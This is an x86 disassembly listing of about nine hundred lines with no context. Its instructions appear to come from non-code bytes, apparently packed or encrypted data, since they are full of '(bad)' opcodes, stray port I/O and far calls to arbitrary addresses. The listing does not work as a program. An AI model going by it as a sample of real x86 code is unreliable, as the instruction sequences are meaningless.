  417c95:	retf   0x2ff0
  417c98:	mov    esp,0xe84c2026
  417c9d:	or     ebx,eax
  417c9f:	xchg   edx,eax
  417ca0:	mov    esp,0x8ff9d72
  417ca5:	mov    ecx,0x2c619418
  417caa:	call   DWORD PTR ds:0xbbb91d6b
  417cb0:	xor    edx,DWORD PTR [ebp+0x3a643f81]
  417cb6:	into   
  417cb7:	xor    bl,BYTE PTR [edx-0x56378e9a]
  417cbd:	fwait
  417cbe:	push   es
  417cbf:	fucomp st(4)
  417cc1:	pusha  
  417cc2:	jge    0x417d41
  417cc4:	or     BYTE PTR [edx],0xce
  417cc7:	cmp    eax,DWORD PTR [eax]
  417cc9:	out    dx,al
  417cca:	rol    DWORD PTR [ebp+0x142dac3f],1
  417cd0:	dec    ecx
  417cd1:	xchg   ecx,eax
  417cd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cd3:	in     al,dx
  417cd4:	and    dl,dh
  417cd6:	jecxz  0x417d3f
  417cd8:	in     al,0x24
  417cda:	inc    edx
  417cdb:	jb     0x417c98
  417cdd:	jne    0x417c88
  417cdf:	imul   edi,DWORD PTR [ebp+0x7b],0x4a
  417ce3:	jno    0x417ccf
  417ce5:	inc    bh
  417ce7:	inc    ebx
  417ce8:	xor    bh,BYTE PTR [esi-0x11]
  417ceb:	jle    0x417c95
  417ced:	scas   al,BYTE PTR es:[edi]
  417cee:	lods   eax,DWORD PTR ds:[esi]
  417cef:	cmp    dl,BYTE PTR [ecx]
  417cf1:	mov    dl,0x4
  417cf3:	dec    eax
  417cf4:	test   al,0x3f
  417cf6:	(bad)  
  417cf7:	adc    esi,edx
  417cf9:	int3   
  417cfa:	loope  0x417d5d
  417cfc:	pop    ds
  417cfd:	call   0x5dea:0x1542de3
  417d04:	rol    al,0x29
  417d07:	imul   BYTE PTR [bx+di+0x69]
  417d0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d0c:	or     BYTE PTR [ecx-0x10],0xe8
  417d10:	adc    cl,BYTE PTR [edi-0x647a4d14]
  417d16:	sub    eax,0x3f38b8ba
  417d1b:	(bad)  
  417d1c:	sahf   
  417d1d:	retf   0x7790
  417d20:	fwait
  417d21:	inc    edi
  417d22:	mov    eax,0xf4890d87
  417d27:	in     eax,dx
  417d28:	mov    al,ds:0x3a4130bf
  417d2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d2e:	push   ss
  417d2f:	mov    DWORD PTR [esi-0x5c],ebp
  417d32:	lods   eax,DWORD PTR ds:[esi]
  417d33:	clc    
  417d34:	pop    esi
  417d35:	in     al,0x99
  417d37:	imul   esi,DWORD PTR [ebx-0x50],0x34c0f548
  417d3e:	popf   
  417d3f:	cdq    
  417d40:	mov    eax,ds:0x9589b405
  417d45:	inc    esp
  417d46:	cwde   
  417d47:	out    0xea,eax
  417d49:	and    eax,0x8b61cf5c
  417d4e:	mov    esi,0xa64a84b3
  417d53:	ror    BYTE PTR [esi-0x7c],cl
  417d56:	loope  0x417dd7
  417d58:	sbb    BYTE PTR [ebp+0x25faec64],dh
  417d5e:	int    0x2
  417d60:	sub    BYTE PTR [ebx-0x25],al
  417d63:	loope  0x417dcf
  417d65:	addr16 mov esp,0x9cd8d5e9
  417d6b:	mov    edi,DWORD PTR [edi+ebx*4]
  417d6e:	lock sub BYTE PTR [edi-0x69b5b79a],0x94
  417d76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d77:	jecxz  0x417d9b
  417d79:	cs call 0x9b87f4dc
  417d7f:	or     BYTE PTR ds:0xe938f02,ch
  417d85:	loop   0x417dea
  417d87:	inc    edi
  417d88:	pop    esi
  417d89:	or     esp,DWORD PTR [edx]
  417d8b:	in     eax,dx
  417d8c:	jnp    0x417da9
  417d8e:	in     al,0x24
  417d90:	cmp    al,0xf0
  417d92:	popf   
  417d93:	pop    edx
  417d94:	mov    BYTE PTR [edi-0x12],dh
  417d97:	call   0x7f66:0xaa10d85
  417d9e:	ret    0x4908
  417da1:	xchg   edi,eax
  417da2:	sbb    eax,0x650f61e9
  417da7:	mov    edi,0xd7f186d2
  417dac:	lahf   
  417dad:	xchg   ecx,eax
  417dae:	test   BYTE PTR [edx+0x74],dl
  417db1:	sbb    bh,BYTE PTR [ebp+0x32ce2171]
  417db7:	mov    ebx,0x2f90bffa
  417dbc:	imul   edx
  417dbe:	imul   ecx,DWORD PTR [ecx+0x27],0x816c5eaa
  417dc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dc6:	xchg   edx,eax
  417dc7:	in     al,dx
  417dc8:	cmp    ah,ah
  417dca:	xchg   esi,eax
  417dcb:	nop
  417dcc:	mov    dh,0xe4
  417dce:	dec    BYTE PTR [ecx-0x27]
  417dd1:	or     BYTE PTR [ebp-0x1d6483f0],0x22
  417dd8:	lods   al,BYTE PTR ds:[esi]
  417dd9:	(bad)  
  417dda:	out    0xe4,al
  417ddc:	and    dl,BYTE PTR [esi+0x6f]
  417ddf:	mov    bl,0x47
  417de1:	mov    cl,0x8d
  417de3:	bound  esp,QWORD PTR [edx]
  417de5:	mov    bh,0x67
  417de7:	adc    al,0x60
  417de9:	pop    edx
  417dea:	mov    DWORD PTR [ebp+0x32dc4ffa],esp
  417df0:	imul   esi,DWORD PTR [ebp-0x4e9d83d7],0x739a865e
  417dfa:	mov    edx,0x76983f44
  417dff:	outs   dx,BYTE PTR ds:[esi]
  417e00:	arpl   WORD PTR [eax+0x78],sp
  417e03:	xor    eax,0x4c65cf61
  417e08:	jmp    0x417e17
  417e0a:	iret   
  417e0b:	shl    DWORD PTR [edi+0x5dc008ad],cl
  417e11:	mov    cl,0xe6
  417e13:	int    0x85
  417e15:	xor    ebp,edi
  417e17:	dec    edi
  417e18:	cmp    BYTE PTR [esp+eax*2],dl
  417e1b:	(bad)  
  417e1c:	mov    BYTE PTR [ecx+0x54],ch
  417e1f:	dec    edi
  417e20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e21:	repz sbb bl,BYTE PTR [edi+0x79c9892b]
  417e28:	push   0x6d156c8c
  417e2d:	into   
  417e2e:	lods   eax,DWORD PTR ds:[esi]
  417e2f:	mov    al,0xac
  417e31:	std    
  417e32:	pop    ds
  417e33:	and    BYTE PTR [edx-0x35],bl
  417e36:	inc    eax
  417e37:	mov    ?,WORD PTR [esi+0x346a7bae]
  417e3d:	add    eax,0xa8c3fc85
  417e42:	popf   
  417e43:	sbb    al,0x40
  417e45:	clc    
  417e46:	enter  0x8c71,0xca
  417e4a:	(bad)  
  417e4b:	loop   0x417dd5
  417e4d:	xchg   ecx,eax
  417e4e:	cmp    al,0xd
  417e50:	dec    eax
  417e51:	call   0xa83f:0xdf3567e7
  417e58:	push   ebx
  417e59:	xor    eax,0xc929bc32
  417e5e:	addr16 push ds
  417e60:	dec    edi
  417e61:	fs sub al,0x70
  417e64:	popa   
  417e65:	push   ss
  417e66:	cmp    eax,0x3ffd7c41
  417e6b:	rcr    DWORD PTR [esi-0x51],1
  417e6e:	cmp    BYTE PTR [ebx-0x9],dh
  417e71:	sub    al,BYTE PTR [eax+0x1ab9bdf7]
  417e77:	ja     0x417e1b
  417e79:	inc    esi
  417e7a:	retf   0x4ea0
  417e7d:	inc    BYTE PTR [eax]
  417e7f:	inc    ebp
  417e80:	push   edx
  417e81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e82:	mov    ds:0xbb8289eb,eax
  417e87:	sub    DWORD PTR [ecx-0x11],eax
  417e8a:	and    BYTE PTR [edx-0x47e1dae],al
  417e90:	sub    BYTE PTR [ebp+0x46f50e71],bl
  417e96:	test   eax,0x458e450b
  417e9b:	test   BYTE PTR [eax+0x5f0d9320],0xa1
  417ea2:	fbstp  TBYTE PTR [ebp-0x48be2d64]
  417ea8:	jmp    0xd166:0xbcc38d03
  417eaf:	mov    bh,0x3b
  417eb1:	fidiv  DWORD PTR [edx+eax*2-0x71]
  417eb5:	mov    bh,0xac
  417eb7:	inc    ecx
  417eb8:	inc    eax
  417eb9:	push   ecx
  417eba:	pop    edi
  417ebb:	and    eax,0x22936bfc
  417ec0:	sbb    al,0xee
  417ec2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ec3:	and    eax,eax
  417ec5:	mov    ch,0xe2
  417ec7:	jl     0x417e5a
  417ec9:	jle    0x417ed1
  417ecb:	mov    ebx,0xdc5465e5
  417ed0:	mov    ecx,0xb8c3e6e0
  417ed5:	pop    ebx
  417ed7:	(bad)  
  417ed8:	mov    ebx,0x82fe22d4
  417edd:	sub    bl,BYTE PTR [ecx]
  417edf:	adc    al,0xb8
  417ee1:	pop    ds
  417ee2:	(bad)  
  417ee3:	neg    DWORD PTR [edx-0x53fff054]
  417ee9:	and    BYTE PTR [ebx+0x25],dl
  417eec:	enter  0xd51e,0x96
  417ef0:	iret   
  417ef1:	pusha  
  417ef2:	stos   BYTE PTR es:[edi],al
  417ef3:	rcr    esp,0x4c
  417ef6:	inc    ebx
  417ef7:	xchg   ebp,eax
  417ef8:	push   0x6f421613
  417efd:	scas   al,BYTE PTR es:[edi]
  417efe:	xor    edx,DWORD PTR [eax]
  417f00:	das    
  417f01:	and    eax,0x2e1d908a
  417f06:	mov    es,WORD PTR [esp+ebp*4-0x39e7885e]
  417f0d:	push   eax
  417f0e:	loopne 0x417f48
  417f10:	pop    edi
  417f11:	hlt    
  417f12:	xor    al,0xfb
  417f14:	fcmovu st,st(3)
  417f16:	push   0xffffffa4
  417f18:	cmp    BYTE PTR [edi-0x6a],bh
  417f1b:	out    0x54,al
  417f1d:	pop    ebx
  417f1e:	push   esp
  417f1f:	pop    edx
  417f20:	out    dx,eax
  417f21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f22:	sub    DWORD PTR ds:0x13ce7fc3,esp
  417f28:	retf   
  417f29:	push   edx
  417f2a:	pushf  
  417f2b:	xor    eax,0x655b551d
  417f30:	(bad)  [edx+0x238319b3]
  417f36:	pop    esi
  417f37:	outs   dx,DWORD PTR ds:[esi]
  417f38:	mov    fs,edi
  417f3a:	dec    edx
  417f3b:	add    BYTE PTR [edx-0x390ca79c],ch
  417f41:	popf   
  417f42:	(bad)  
  417f43:	mov    ds:0x19c3bf8c,eax
  417f48:	push   esp
  417f49:	call   0xf5c765e0
  417f4e:	ficomp DWORD PTR [esi]
  417f50:	xor    esp,0xffffffcf
  417f53:	push   0x12113335
  417f58:	shl    ebp,1
  417f5a:	lock pushf 
  417f5c:	scas   al,BYTE PTR es:[edi]
  417f5d:	jecxz  0x417f12
  417f5f:	js     0x417eff
  417f61:	xchg   esp,eax
  417f62:	cwde   
  417f63:	stos   DWORD PTR es:[edi],eax
  417f64:	xor    eax,0x2db652bf
  417f69:	jmp    0xaf0f:0xc347b8d2
  417f70:	cmp    BYTE PTR ss:[ecx+0x2205f9a8],ah
  417f77:	pop    ebp
  417f78:	(bad)  
  417f79:	jge    0x417f20
  417f7b:	sbb    BYTE PTR [edx+0x20361b1c],bl
  417f81:	inc    ebx
  417f82:	fstp   st(3)
  417f84:	pop    eax
  417f85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f86:	loopne 0x417f5a
  417f88:	mov    dh,0xf7
  417f8a:	fs dec ebx
  417f8c:	and    al,0xd6
  417f8e:	mov    edx,0x64f4567e
  417f93:	or     dh,BYTE PTR [edi+eax*4]
  417f96:	js     0x417fb2
  417f98:	inc    ecx
  417f99:	pop    ds
  417f9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f9b:	xchg   ebx,eax
  417f9c:	dec    edx
  417f9d:	gs pop edx
  417f9f:	cmc    
  417fa0:	adc    dl,0x1
  417fa3:	jne    0x417fdd
  417fa5:	cmp    BYTE PTR [ebp-0x10a737dd],0xdf
  417fac:	int    0xed
  417fae:	dec    ebx
  417faf:	mov    ds:0x1b62a277,al
  417fb4:	mov    bl,0x4f
  417fb6:	in     al,0x19
  417fb8:	lds    esi,FWORD PTR [edi]
  417fba:	jle    0x417fc0
  417fbc:	call   0xd536:0x519f9bf7
  417fc3:	jmp    0x575a2a88
  417fc8:	pusha  
  417fc9:	jmp    0x5c4db9c4
  417fce:	fiadd  WORD PTR [edx]
  417fd0:	and    ebx,ebx
  417fd2:	fs mov dh,0x8b
  417fd5:	ret    0x679
  417fd8:	pop    eax
  417fd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fda:	retf   0xe38d
  417fdd:	xchg   esp,eax
  417fde:	xchg   edx,eax
  417fdf:	sub    DWORD PTR [eax+ebx*2+0x10],esp
  417fe3:	pop    esp
  417fe4:	ins    DWORD PTR es:[edi],dx
  417fe5:	iret   
  417fe6:	inc    ebp
  417fe7:	push   ss
  417fe8:	xchg   esp,eax
  417fe9:	fnstenv ds:0x6ce64731
  417fef:	fisubr WORD PTR [esi-0x4f]
  417ff2:	mov    esi,DWORD PTR [eax]
  417ff4:	jnp    0x417f9c
  417ff6:	mov    ebp,0x8149bf6
  417ffb:	shl    ch,0x81
  417ffe:	jge    0x417ffb
  418000:	out    0xcb,eax
  418002:	popa   
  418003:	xor    bh,BYTE PTR [ecx+0x29]
  418006:	loop   0x418008
  418008:	ins    BYTE PTR es:[edi],dx
  418009:	push   eax
  41800a:	sar    BYTE PTR [ebp+0x2f0e58d4],0xbf
  418011:	cmp    cl,BYTE PTR [esi-0x360620e7]
  418017:	sbb    DWORD PTR cs:[ebx+0x4804e659],esi
  41801e:	and    edi,DWORD PTR [edx]
  418020:	fwait
  418021:	push   es
  418022:	add    edi,esp
  418024:	cdq    
  418025:	xor    al,0x22
  418027:	call   0xcb44aff
  41802c:	push   esi
  41802d:	adc    eax,0x5e490188
  418032:	les    ebp,FWORD PTR [edx+0x13]
  418035:	imul   esi,eax,0xffffffb8
  418038:	sar    BYTE PTR [edi+0xd],1
  41803b:	jle    0x417fea
  41803d:	xchg   ecx,eax
  41803e:	add    edi,esi
  418040:	mov    edx,0xad7aded8
  418045:	(bad)  
  418046:	js     0x418031
  418048:	jo     0x417fef
  41804a:	mov    ds:0x72dd7c27,eax
  41804f:	pushf  
  418050:	mov    eax,0x2162c193
  418055:	xchg   edx,eax
  418056:	jp     0x418062
  418058:	cmp    esi,eax
  41805a:	sub    ecx,ebx
  41805c:	out    0xed,al
  41805e:	inc    edx
  41805f:	sub    eax,0x71f3a6d3
  418064:	sti    
  418065:	in     eax,dx
  418066:	into   
  418067:	push   edx
  418068:	data16 int 0x3a
  41806b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41806c:	in     al,dx
  41806d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41806e:	push   esp
  41806f:	fstp   QWORD PTR [ebx]
  418071:	popf   
  418072:	cmp    al,0x1c
  418074:	push   edx
  418075:	fwait
  418076:	adc    al,0x71
  418078:	loopne 0x418033
  41807a:	xor    cl,BYTE PTR [eax]
  41807c:	xchg   DWORD PTR [eax+eax*1-0x1c],ebx
  418080:	inc    ebx
  418081:	int    0x4f
  418083:	test   DWORD PTR [esi+esi*2+0x6c689baa],ebx
  41808a:	call   0x6f84:0xde3427ef
  418091:	enter  0xdfed,0x54
  418095:	cli    
  418096:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418097:	mov    ebp,0x7bdc3529
  41809c:	inc    ebp
  41809d:	repnz fist WORD PTR [ecx+0x54]
  4180a1:	retf   
  4180a2:	xor    DWORD PTR [esi+esi*8],ebx
  4180a5:	rcr    DWORD PTR [ebx-0x2d],0x38
  4180a9:	(bad)  
  4180aa:	loope  0x4180cc
  4180ac:	cmp    ebx,DWORD PTR [edx+0x5beed399]
  4180b2:	cmp    eax,0xe5ddfc46
  4180b7:	jg     0x4180d0
  4180b9:	sti    
  4180ba:	imul   eax,eax,0x27
  4180bd:	dec    edx
  4180be:	aas    
  4180bf:	mov    ch,0xce
  4180c1:	nop
  4180c2:	ins    DWORD PTR es:[edi],dx
  4180c3:	mov    ds:0xda6a2c26,eax
  4180c8:	arpl   WORD PTR [edi],bp
  4180ca:	arpl   WORD PTR [ebp+0x49],si
  4180cd:	mov    DWORD PTR ds:0x253f9d10,eax
  4180d3:	sbb    al,0xa
  4180d5:	pop    esp
  4180d6:	mov    ebx,0x72e7f80f
  4180db:	fs int 0xb9
  4180de:	sub    ebx,0x52
  4180e1:	push   ecx
  4180e2:	inc    esi
  4180e3:	jo     0x4180fa
  4180e5:	or     bl,BYTE PTR [ecx+0x2d]
  4180e8:	hlt    
  4180e9:	mov    al,0xf4
  4180eb:	cli    
  4180ec:	pop    ss
  4180ed:	ret    
  4180ee:	push   eax
  4180ef:	add    edx,esi
  4180f1:	test   dl,dl
  4180f3:	adc    dl,BYTE PTR [eax+0x39345c3e]
  4180f9:	mov    ds:0x7ec12eec,eax
  4180fe:	fcmovb st,st(7)
  418100:	and    DWORD PTR [ebp+0x5574a86a],edx
  418106:	int    0xdc
  418108:	sahf   
  418109:	jle    0x4180ed
  41810b:	or     al,0xd1
  41810d:	enter  0x226e,0xa3
  418111:	push   esp
  418112:	adc    ebx,DWORD PTR [ecx]
  418114:	inc    edi
  418115:	call   0x422d:0xe9042296
  41811c:	mov    DWORD PTR [esi],edi
  41811e:	cwde   
  41811f:	mov    esp,0x8b098409
  418124:	cmp    eax,0xe24519da
  418129:	pop    ebp
  41812a:	aas    
  41812b:	ror    al,0xb5
  41812e:	loopne 0x41813d
  418130:	stos   DWORD PTR es:[edi],eax
  418131:	adc    ecx,DWORD PTR [esi]
  418133:	and    al,0x3a
  418135:	enter  0x83b3,0x6c
  418139:	and    al,0xd5
  41813b:	jo     0x4180dd
  41813d:	arpl   WORD PTR [ecx+0x79],bx
  418140:	call   0x12c7:0x4df355fa
  418147:	(bad)  
  418148:	push   esp
  418149:	cmp    bh,BYTE PTR [ecx]
  41814b:	push   ebp
  41814c:	xchg   esp,eax
  41814d:	jg     0x4181b8
  41814f:	adc    eax,0x98eb159b
  418154:	xchg   edi,eax
  418155:	mov    ch,0x1b
  418157:	dec    edx
  418158:	and    eax,0xc3cff167
  41815d:	scas   al,BYTE PTR es:[edi]
  41815e:	test   ch,dh
  418160:	jmp    0x418187
  418162:	and    BYTE PTR [edi-0x6325f1fe],ah
  418168:	gs es add al,cl
  41816c:	repnz scas eax,DWORD PTR es:[edi]
  41816e:	leave  
  41816f:	and    eax,0x88c384fc
  418174:	cmc    
  418175:	iret   
  418176:	or     al,cl
  418178:	pop    esi
  418179:	mov    bh,0x99
  41817b:	inc    esp
  41817c:	mov    edx,0x41ca743e
  418181:	jecxz  0x41814d
  418183:	aaa    
  418184:	push   ecx
  418185:	mov    al,ds:0x9566fbfc
  41818a:	(bad)  
  41818b:	xlat   BYTE PTR ds:[ebx]
  41818c:	and    ecx,DWORD PTR [eax+0x6]
  41818f:	fs cdq 
  418191:	push   ds
  418192:	dec    ecx
  418193:	inc    ebx
  418194:	cdq    
  418195:	mov    al,ds:0xf8e67080
  41819a:	cmp    BYTE PTR [eax+0x3201cda2],cl
  4181a0:	test   DWORD PTR [ecx-0x2e],edx
  4181a3:	jo     0x418198
  4181a5:	dec    edi
  4181a6:	popf   
  4181a7:	imul   edi,esi,0xb23ed8eb
  4181ad:	jbe    0x4181f2
  4181af:	push   ecx
  4181b0:	cmc    
  4181b1:	iret   
  4181b2:	mov    esi,0x6c9a0de4
  4181b7:	subps  xmm3,XMMWORD PTR [ebp+0x4c852ecc]
  4181be:	sahf   
  4181bf:	lods   al,BYTE PTR ds:[esi]
  4181c0:	push   eax
  4181c1:	add    BYTE PTR [edi],bl
  4181c3:	not    DWORD PTR [edi-0x55463996]
  4181c9:	adc    eax,0x851210c0
  4181ce:	test   BYTE PTR [edi],al
  4181d0:	fldenv [ecx]
  4181d2:	mov    ebx,0x4d1dc7d7
  4181d7:	pusha  
  4181d8:	cld    
  4181d9:	push   ebp
  4181da:	dec    esi
  4181db:	mov    WORD PTR [edx],ss
  4181dd:	pop    ss
  4181de:	push   esi
  4181df:	push   edx
  4181e0:	icebp  
  4181e1:	cmp    ch,ah
  4181e3:	mov    al,0x71
  4181e5:	test   BYTE PTR [eax+0x2973036c],dh
  4181eb:	stc    
  4181ec:	dec    edi
  4181ed:	jo     0x41824e
  4181ef:	push   edx
  4181f0:	ins    BYTE PTR es:[edi],dx
  4181f1:	cmp    al,0x7e
  4181f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181f4:	push   0xa
  4181f6:	aam    0xe1
  4181f8:	adc    BYTE PTR [esi+0x29],bl
  4181fb:	scas   al,BYTE PTR es:[edi]
  4181fc:	mov    ebx,0xc20d0ad4
  418201:	dec    ebx
  418202:	or     DWORD PTR [eax+ecx*1],ebx
  418205:	mov    ?,edx
  418207:	add    dh,BYTE PTR [esi+0x738084f6]
  41820d:	out    0x6f,al
  41820f:	clc    
  418210:	cmp    edx,edx
  418212:	mov    ah,0x38
  418214:	jbe    0x41819e
  418216:	mov    ebp,0x1913080a
  41821b:	jb     0x41828b
  41821d:	sub    esp,edx
  41821f:	add    al,0xce
  418221:	sbb    edi,esi
  418223:	jl     0x41822a
  418225:	mov    al,0xe3
  418227:	cmp    BYTE PTR [ecx],bh
  418229:	jno    0x418276
  41822b:	dec    eax
  41822c:	sbb    ch,dh
  41822e:	popa   
  41822f:	adc    ebp,ebx
  418231:	ins    DWORD PTR es:[edi],dx
  418232:	es jns 0x418221
  418235:	adc    DWORD PTR [edx-0x51],ebp
  418238:	in     eax,dx
  418239:	adc    eax,0x3fbe6bd3
  41823e:	int    0xfb
  418240:	adc    BYTE PTR [ecx-0x1b179576],ah
  418246:	lods   eax,DWORD PTR ds:[esi]
  418247:	and    DWORD PTR [eax+0x1c310999],edx
  41824d:	pop    esi
  41824e:	cmp    BYTE PTR [esp+ebx*2],dh
  418251:	dec    ebp
  418252:	psubusb mm2,QWORD PTR [ecx-0x53]
  418256:	pushf  
  418257:	aaa    
  418258:	sbb    eax,edx
  41825a:	sbb    al,0x72
  41825c:	mov    eax,ds:0x88abbacf
  418261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418262:	or     eax,0x3038eabf
  418267:	adc    al,0x3f
  418269:	xor    bh,BYTE PTR [esi]
  41826b:	leave  
  41826c:	sbb    BYTE PTR [esp+ebx*8+0x55],cl
  418270:	adc    dl,BYTE PTR [edi+0x441fbfe1]
  418276:	jnp    0x4182ea
  418278:	outs   dx,BYTE PTR ds:[esi]
  418279:	push   ebx
  41827a:	cmp    edx,DWORD PTR [ecx-0x27f0a6e2]
  418280:	push   ss
  418281:	data16 fild DWORD PTR [ecx+esi*4-0x36]
  418286:	call   0xa111:0xac799c24
  41828d:	mov    dh,0xb4
  41828f:	jae    0x4182c2
  418291:	bnd je 0x418297
  418294:	push   edx
  418295:	cli    
  418296:	push   edi
  418297:	(bad)  
  418298:	sub    edi,esi
  41829a:	cli    
  41829b:	(bad)  
  41829c:	cwde   
  41829d:	pop    eax
  41829e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41829f:	(bad)  
  4182a1:	aad    0xbe
  4182a3:	add    BYTE PTR [ebx],ch
  4182a5:	xor    eax,esi
  4182a7:	inc    ebp
  4182a8:	mov    edx,0x2ec90b99
  4182ad:	loopne 0x4182bb
  4182af:	or     BYTE PTR [ecx],cl
  4182b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182b2:	fs adc eax,0x9ec2f323
  4182b8:	cmp    eax,0xbb21aa5e
  4182bd:	in     al,dx
  4182be:	inc    eax
  4182bf:	jle    0x41824e
  4182c1:	push   esi
  4182c2:	xor    ebx,DWORD PTR [esi]
  4182c4:	mov    dl,0x95
  4182c6:	inc    edx
  4182c7:	pushf  
  4182c8:	xchg   esi,eax
  4182c9:	jmp    0x41828e
  4182cb:	clc    
  4182cc:	jg     0x4182e5
  4182ce:	scas   eax,DWORD PTR es:[edi]
  4182cf:	or     eax,0x60b96629
  4182d4:	dec    esp
  4182d5:	mov    ds:0xec05e0da,al
  4182da:	jecxz  0x418291
  4182dc:	loope  0x4182eb
  4182de:	outs   dx,DWORD PTR ds:[esi]
  4182df:	add    al,ch
  4182e1:	fdivrp st(1),st
  4182e4:	jmp    0x4182c9
  4182e6:	test   BYTE PTR [ecx],0xb2
  4182e9:	mov    bl,0xb3
  4182eb:	jle    0x418344
  4182ed:	in     eax,0xe
  4182ef:	pop    ebp
  4182f0:	bound  esi,QWORD PTR [ecx]
  4182f2:	fnstsw WORD PTR ds:0x78552d1d
  4182f8:	xchg   esp,eax
  4182f9:	loope  0x418374
  4182fb:	leave  
  4182fc:	xor    al,0x52
  4182fe:	retf   0xd05
  418301:	and    al,0x60
  418303:	xlat   BYTE PTR ds:[ebx]
  418304:	repz push esi
  418306:	imul   edi,ebp,0xffffffe7
  418309:	sbb    bh,BYTE PTR [eax]
  41830b:	xor    eax,0x746909a1
  418311:	outs   dx,BYTE PTR ds:[esi]
  418312:	jo     0x4182ad
  418314:	and    al,BYTE PTR [ebx]
  418316:	sub    edx,ecx
  418318:	add    BYTE PTR [eax+0x10],cl
  41831b:	mov    al,0xa3
  41831d:	nop
  41831e:	lea    eax,[ebx-0x65957dc6]
  418324:	ss gs mov edi,0x1eec5316
  41832b:	mov    eax,0xe33232d6
  418330:	iret   
  418331:	cmp    al,0x5
  418333:	jo     0x418307
  418335:	(bad)  
  418336:	push   es
  418337:	mov    edx,0xdd8a6643
  41833c:	or     dh,BYTE PTR [eax+0x47]
  41833f:	adc    ebp,DWORD PTR [esi]
  418341:	ins    BYTE PTR es:[edi],dx
  418342:	mov    ?,esi
  418344:	adc    BYTE PTR [edi-0xf61426a],0x6f
  41834b:	cmp    BYTE PTR [ebp+ebp*1+0x59],bh
  41834f:	sub    eax,edx
  418351:	into   
  418352:	mov    eax,ds:0x1fa5d1b
  418357:	xchg   edx,edi
  418359:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41835a:	dec    ecx
  41835b:	mov    bh,0xe2
  41835d:	push   cs
  41835e:	inc    ebp
  41835f:	mov    bl,0xa5
  418361:	pop    ebp
  418362:	or     DWORD PTR [eax+eiz*2+0x53],ecx
  418366:	int    0x28
  418368:	fwait
  418369:	jl     0x418310
  41836b:	addr16 xor al,0xd1
  41836e:	inc    ecx
  41836f:	test   BYTE PTR [ebx+0x0],bl
  418372:	or     DWORD PTR [eax],esi
  418374:	xchg   ebx,eax
  418375:	push   edi
  418376:	aas    
  418377:	push   cs
  418378:	inc    eax
  418379:	mov    eax,0xa9db02f1
  41837e:	sub    dh,BYTE PTR [ebx-0x159aa88f]
  418384:	add    al,0xaa
  418386:	into   
  418387:	jl     0x4183aa
  418389:	fsubrp st(0),st
  41838b:	les    esi,FWORD PTR [ebx-0x4d]
  41838e:	int    0x4
  418390:	dec    esi
  418391:	cmp    DWORD PTR fs:[eax-0x524e6ee8],eax
  418398:	xchg   ch,dl
  41839a:	test   eax,0x357e5a1a
  41839f:	loop   0x41841b
  4183a1:	lods   al,BYTE PTR ds:[esi]
  4183a2:	(bad)  
  4183a3:	mov    esi,0x4a262b58
  4183a8:	mov    al,0x93
  4183aa:	fs xchg edi,eax
  4183ac:	mov    cl,0xc9
  4183ae:	(bad)  
  4183af:	int    0xbe
  4183b1:	pop    esi
  4183b2:	and    ebx,DWORD PTR [eax+0x29]
  4183b5:	cmp    eax,0x47b6d40d
  4183ba:	test   BYTE PTR [ebx],bh
  4183bc:	aaa    
  4183bd:	(bad)  
  4183be:	mov    cl,0xb6
  4183c0:	into   
  4183c1:	or     DWORD PTR [ebx],0xffffff88
  4183c4:	push   cs
  4183c5:	cmp    al,0x6d
  4183c7:	xchg   BYTE PTR [ecx+0x3c08d384],dh
  4183cd:	sbb    dh,bh
  4183cf:	cwde   
  4183d0:	nop
  4183d1:	pop    edi
  4183d2:	mov    WORD PTR [esi+0x2b3e08aa],es
  4183d8:	adc    DWORD PTR [ebx],ebx
  4183da:	and    DWORD PTR [eax],esi
  4183dc:	dec    esi
  4183dd:	pop    ss
  4183de:	(bad)  [edx-0x68ef931d]
  4183e4:	test   BYTE PTR [ebx],ah
  4183e6:	(bad)  
  4183e7:	out    0x42,al
  4183e9:	es pop ss
  4183eb:	fdiv   QWORD PTR [edx-0xccb32ee]
  4183f1:	cli    
  4183f2:	or     edi,esp
  4183f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183f5:	or     al,0x65
  4183f7:	addr16 push ds
  4183f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183fa:	ret    0xe9c7
  4183fd:	xor    al,0x40
  4183ff:	repz add eax,0xacc7790b
  418405:	ds add eax,esp
  418408:	xchg   ebp,eax
  418409:	xchg   edi,eax
  41840a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41840b:	and    eax,0xa76d5a86
  418410:	mov    ah,BYTE PTR [ebx+0x481afb68]
  418416:	cmc    
  418417:	or     eax,0x10c0f8e4
  41841c:	inc    esp
  41841d:	pop    esi
  41841e:	stos   DWORD PTR es:[edi],eax
  41841f:	repz cmp al,0xb7
  418422:	stc    
  418423:	xor    eax,0x49f53001
  418428:	pop    es
  418429:	fbld   TBYTE PTR [ecx+edx*2]
  41842c:	fs or  esp,0x19
  418430:	mov    ebp,0xbe28ce85
  418435:	arpl   WORD PTR [esp+eax*8],si
  418438:	jp     0x41844e
  41843a:	lea    ecx,[esi-0x3c9e2f33]
  418440:	mov    ecx,edx
  418442:	push   esp
  418443:	adc    DWORD PTR [ebx+0x2c9eb023],ecx
  418449:	call   0x98df2c37
  41844e:	jns    0x4183e9
  418450:	or     eax,0x4233b158
